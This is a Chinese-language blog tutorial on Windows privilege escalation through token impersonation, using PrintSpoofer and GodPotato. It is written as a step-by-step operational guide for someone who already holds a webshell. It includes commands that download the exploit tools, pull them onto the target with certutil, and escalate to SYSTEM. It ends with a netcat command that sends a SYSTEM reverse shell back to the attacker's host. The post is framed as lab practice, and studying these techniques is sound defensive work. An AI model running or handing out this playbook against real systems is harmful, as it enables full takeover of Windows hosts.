---
title: Windows提权2：令牌窃取与土豆家族实战
date: 2026-03-21 8:00:00
tags:
- 提权
- Windows
- Potato
- 令牌窃取
categories:
- ISW
- Windows提权
---

# 前置基础知识

## 什么是“令牌窃取”

在讲工具之前，我们先搞懂我们要干嘛。

### 什么是令牌 (Token)？

在 Windows 里，**“令牌”就像是酒店的门禁卡**。

* 普通用户拿着“普通卡”，只能进自己的房间（普通目录）。

* `SYSTEM` 拿着“总控卡”，能进酒店的任何房间（操作整个系统）。

### 什么是 SeImpersonatePrivilege（模拟特权）？

这个特权翻译过来叫“模拟客户端后身份”。

* **打个比方**：如果你拥有这个特权，就相当于你是酒店的“前台”。虽然你自己的权限不高
  
  但**只要有一位 VIP (SYSTEM) 把他的总控卡递给你，你就有权“戴上他的工牌”，以他的身份去开门。**

* **为什么 Web 服务会有这个权限？** 因为像 IIS 或 SQL Server 这样的服务，经常需要代替访问网站的用户去读取文件，所以微软默认给了它们这个“借用身份”的特权。

### “土豆家族提权”是怎么发挥作用的？

既然我们是“前台”，万事俱备，只欠一张“VIP”。

**土豆提权的核心原理**：利用 Windows 内部的某种机制（比如打印机服务漏洞、RPC 漏洞），**“骗” SYSTEM 账户主动来找我们认证，并把它的令牌（总控卡）丢给我们。** 我们拿到令牌后，执行 `cmd.exe`，我们就变成 SYSTEM 了





## 下载土豆提权工具：

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
```





# 实战：

假设我们现在已经拿到了webshell或者反弹shell

## 第一步：确认权限

确认有没有最关键的SeImpersonatePrivilege（模拟特权）

* **命令**:
  
  ```bash
  whoami /priv
  ```

* **命令解析**：查看当前账户特权。

* **观察点**：如果输出列表中包含 `SeImpersonatePrivilege`，状态无论是 `Enabled`（已启用）还是 `Disabled`（已禁用），**只要它在列表里，就说明提权条件成立**



## 第二步：把攻击exe传到靶机

在存放土豆 `.exe` 的目录下执行 `python3 -m http.server 80`

**在靶机的 Shell 中下载武器**：

* **命令**:
  
  ```bash
  cd C:\Windows\Temp
  certutil.exe -urlcache -split -f "http://WSL_IP/PrintSpoofer64.exe" ps.exe
  ```

**命令解析**：切换到临时目录，并使用 `certutil` 下载 `PrintSpoofer64.exe`，保存为短名字 `ps.exe` 以方便后续敲击。

第三步：执行命令 (成功提权)
-----------------

### 方案 A：使用 PrintSpoofer 提权

**命令**:

```bash
ps.exe -i -c cmd
```

**命令解析**：

* `-i` (Interactive)：互动模式，表示我要直接在这个黑框框里获取一个交互式的 Shell。

* `-c cmd` (Command)：拿到 SYSTEM 权限后，帮我执行 `cmd.exe` 这个程序。

**成功标志**：当你敲下回车，屏幕上通常会弹出一句 `[+] Found privilege: SeImpersonatePrivilege`，紧接着你的输入提示符会变。此时再敲 `whoami`，如果显示 `nt authority\system`，**就说明提权成功了**



### 方案 B：使用 GodPotato 提权 (作为备用)

如果靶机打了补丁或者没开打印机服务，换神土豆

用下面这两条命令看.NET版本，最高版本是什么就用什么神土豆

```bash
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
dir /b /ad C:\Windows\Microsoft.NET\Framework
```

* **执行命令**:
  
  ```bash
  GodPotato-NET4.exe -cmd "cmd.exe"
  ```

* **命令解析**：GodPotato 的语法略有不同，`-cmd` 后面跟上用双引号括起来的你想执行的命令。 _(注：GodPotato 有 .NET 2.0 / 3.5 / 4.0 多个版本，通常实战中用 .NET 4.0 的版本即可通杀现代系统)_









# 如果没有“交互式” Shell 怎么办？

实战有时候不支持我们反弹shell，如果你在蚁剑的webshell里敲 `ps.exe -i -c cmd`，它会卡死或者报错。

**解决办法：让土豆以 SYSTEM 权限反弹一个真实的 Shell 给你**

1.  Ubuntu 先准备好监听：`nc -lvnp 4444`。

2. 把一个 Windows 版的 `nc.exe` 和土豆一起传到靶机的 `C:\Windows\Temp`。

3. **在蚁剑里敲这个终极命令**：
   
   * **命令**:
     
     ```bash
     ps.exe -c "C:\Windows\Temp\nc.exe <你的WSL_IP> 4444 -e cmd.exe"
     ```

**命令解析**：不要交互了（去掉了 `-i`），要求拿到 SYSTEM 之后，直接执行 `nc.exe`，把 SYSTEM 权限的 cmd 弹回 Ubuntu

此时，你的 Ubuntu 终端里就会接收到一个拥有最高权限的系统级 Shell


